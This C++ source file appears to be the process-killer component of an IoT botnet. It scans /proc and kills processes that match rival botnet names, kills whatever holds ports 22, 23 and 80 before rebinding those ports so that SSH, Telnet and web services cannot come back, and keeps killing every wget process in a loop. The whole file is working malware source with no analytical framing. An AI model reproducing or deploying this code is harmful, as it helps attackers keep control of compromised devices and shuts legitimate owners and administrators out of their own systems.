#define KILLER
#ifdef KILLER

#include "headers/killer.hpp"

#include <arpa/inet.h>
#include <dirent.h>

#include <csignal>
#include <cstring>
#include <fstream>
#include <thread>

#include "headers/config.hpp"
#include "headers/include.hpp"
#include "headers/utils.hpp"

#ifdef MAPS_KILLER
const std::string MapsNames[11] = {
    "boatnet",
    "SSH",
    "robbin",
    "orcod",
    "sora",
    "ssh.vegasec",
    "Cutie",
    "WTF",
    "Ohshit",
    "kreb",
    "botnet",
};
#endif

#ifdef EXE_KILLER
const string SIGNATURES[1] = {
    "UPX!",  // upx magic
};
#endif

#ifdef EXE_KILLER
bool Contains(const string str) {
  if (str.length() < 3) {
    return false;
  }

  for (string s : SIGNATURES) {
    if (strstr(str.c_str(), s.c_str())) {
      return true;
    }
  }

  return false;
}

void ExeKiller() {
  DIR* dir = opendir("/proc");
  if (dir == nullptr) {
#ifdef DEBUG
    printf("[DEBUG] Exe killer: Can't open /proc");
#endif
    return;
  }

  struct dirent* entry;
  while ((entry = readdir(dir)) != nullptr) {
    if (entry->d_type == DT_DIR) {
      if (!IsInteger(entry->d_name)) {
        continue;
      };

      int pid = stoi(entry->d_name);
      if (pid > MAX_PID || pid < MIN_PID || pid == getpid() || pid == getppid()) {
        continue;
      }

      std::ifstream proc("/proc/" + static_cast<string>(entry->d_name) + "/exe");
      if (!proc.is_open()) {
        continue;
      }

      std::string line;
      while (std::getline(proc, line)) {
        if (Contains(line)) {
#ifdef DEBUG
          printf("[DEBUG] EXE killer: Pid: %d\n", pid);
#endif
          // kill(pid, 9);
          continue;
        }
      }

      proc.close();
    }
  }

  closedir(dir);
  return;
}
#endif

#ifdef MAPS_KILLER
void MapsKiller() {
  DIR* dir = opendir("/proc");
  if (dir == nullptr) {
#ifdef DEBUG
    printf("[DEBUG] Maps killer: Can't open /proc");
#endif
    return;
  }

  struct dirent* entry;
  while ((entry = readdir(dir)) != nullptr) {
    if (entry->d_type == DT_DIR) {
      if (!IsInteger(entry->d_name)) {
        continue;
      };

      int pid = stoi(entry->d_name);
      if (pid > MAX_PID || pid < MIN_PID || pid == getpid() || pid == getppid()) {
        continue;
      }

      std::ifstream proc("/proc/" + static_cast<string>(entry->d_name) + "/maps");
      if (!proc.is_open()) {
        continue;
      }

      std::string line;
      while (std::getline(proc, line)) {
        for (string s : MapsNames) {
          if (strstr(line.c_str(), s.c_str())) {
#ifdef DEBUG
            printf("[DEBUG] Maps killer: Found %s. Pid: %d\n", s.c_str(), pid);
#endif
            kill(pid, 9);
          }
        }
      }
      proc.close();
    }
  }

  closedir(dir);

  return;
}
#endif

int getPidByInode(int inode) {
  DIR* dir = opendir("/proc");
  if (!dir) {
#ifdef DEBUG
    printf("[DEBUG] Kill by port: Can't open /proc/net/tcp\n");
#endif
    return 0;
  }

  int result = 0;
  struct dirent* entry;
  while ((entry = readdir(dir))) {
    if (!IsInteger(entry->d_name)) {
      continue;
    }

    int pid = std::stoi(entry->d_name);
    std::string fdDir = "/proc/" + std::to_string(pid) + "/fd";
    DIR* fd = opendir(fdDir.c_str());
    if (!fd) {
      continue;
    }

    struct dirent* fdEntry;
    while ((fdEntry = readdir(fd))) {
      if (fdEntry->d_type == DT_DIR) {
        continue;
      }

      char linkTarget[PATH_MAX];
      memset(linkTarget, 0, sizeof(linkTarget));
      long bytesRead = readlink((fdDir + "/" + fdEntry->d_name).c_str(), linkTarget, sizeof(linkTarget));
      if (bytesRead == -1) {
        continue;
      }

      std::string link(linkTarget, bytesRead);
      if (link.find("socket:[" + std::to_string(inode) + "]") != std::string::npos) {
        result = pid;
        break;
      }
    }
    closedir(fd);

    if (result != 0) {
      break;
    }
  }
  closedir(dir);

  return result;
}
void KillByPort(const int targ_port) {
  std::ifstream proc("/proc/net/tcp");
  if (!proc.is_open()) {
#ifdef DEBUG
    printf("[DEBUG] Kill by port: Can't open /proc/net/tcp\n");
#endif
    return;
  }

  int i = 0;
  std::string line;
  while (std::getline(proc, line)) {
    i++;
    if (line.size() < 10 || i == 1) {
      continue;
    }

    std::string porthex = line.substr(6, 16).substr(9, 4);
    int port = std::stoi(porthex, nullptr, 16);
    if (port != targ_port) {
      continue;
    }

    std::string inode = line.substr(90, line.find(" ") - 90);
    int inodeNum = std::stoi(inode);
    int pid = getPidByInode(inodeNum);
    if (pid <= 0 || pid == getpid() || pid == getppid()) {
      continue;
    }

#ifdef DEBUG
    printf("[DEBUG] Kill By Port: Found: %d. Pid: %d\n", port, pid);
#endif
    kill(pid, 9);

    return;
  }
}

void KillByName(const string name) {
  DIR* dir = opendir("/proc");
  if (dir == nullptr) {
#ifdef DEBUG
    printf("[DEBUG] Exe killer: Can't open /proc");
#endif
    return;
  }

  struct dirent* entry;
  while ((entry = readdir(dir)) != nullptr) {
    if (entry->d_type == DT_DIR) {
      if (!IsInteger(entry->d_name)) {
        continue;
      };

      int pid = stoi(entry->d_name);
      if (pid > MAX_PID || pid < MIN_PID || pid == getpid() || pid == getppid()) {
        continue;
      }

      std::ifstream proc("/proc/" + static_cast<string>(entry->d_name) + "/comm");
      if (!proc.is_open()) {
        continue;
      }

      std::string line;
      while (std::getline(proc, line)) {
        if (strstr(line.c_str(), name.c_str())) {
#ifdef DEBUG
          printf("[DEBUG] Kill by name: Found %s. Pid: %d\n", name.c_str(), pid);
#endif
          kill(pid, 9);
        }
      }

      proc.close();
    }
  }
  closedir(dir);
  return;
}

void RebindPort(int port) {
  int fd;
  sockaddr_in sa;

  if ((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
#ifdef DEBUG
    printf("[DEBUG] Cannot create a new socket\n");
#endif
    return;
  }

  sa.sin_family = AF_INET;
  sa.sin_port = htons(port);
  sa.sin_addr.s_addr = inet_addr("127.0.0.1");

  if (bind(fd, (struct sockaddr*)&sa, sizeof(sa)) < 0) {
    return;
  }
}

void StartKiller() {
  thread T1([]() {
    while (1) {
      KillByName("wget");
      usleep(250 * 1000);
    }
  });
  T1.detach();

  KillByPort(80);
  KillByPort(22);
  KillByPort(23);
  usleep(100 * 1000);
  RebindPort(22);
  RebindPort(23);
  RebindPort(80);

  while (1) {
#ifdef MAPS_KILLER
    MapsKiller();
#endif
#ifdef EXE_KILLER
    ExeKiller();
#endif
    sleep(KILLER_SLEEP_TIME);
  }
}

#endif